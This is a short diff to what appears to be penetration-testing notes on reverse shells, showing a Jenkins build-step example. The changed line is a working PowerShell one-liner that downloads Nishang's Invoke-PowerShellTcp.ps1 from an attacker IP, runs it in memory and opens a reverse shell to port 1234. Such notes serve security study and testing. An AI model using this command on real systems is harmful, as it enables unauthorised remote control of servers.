@@ -36,12 +36,12 @@ This can be in scenarios such as
 Nishang Script: Invoke-PowerShellTcp.ps1
 
 
-	**Jenkins Server Example**
+***Jenkins Server Example***
 
 ```
 Inside the Build that allows for Batch Execution of Windows Command you can give a command like
 
-**powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.12.172/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.12.172 -Port 1234
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.12.172/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.12.172 -Port 1234
 ```
 
 
